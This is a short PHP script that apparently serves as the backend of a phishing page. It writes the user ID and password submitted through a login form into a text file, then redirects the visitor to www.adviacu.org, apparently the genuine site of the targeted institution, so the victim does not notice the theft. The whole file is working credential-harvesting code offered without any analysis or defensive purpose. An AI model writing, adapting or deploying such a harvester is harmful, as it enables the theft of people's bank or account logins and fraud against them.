<?php

file_put_contents("usernames.txt", "Account: " . $_POST['user_id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.adviacu.org/');
exit();
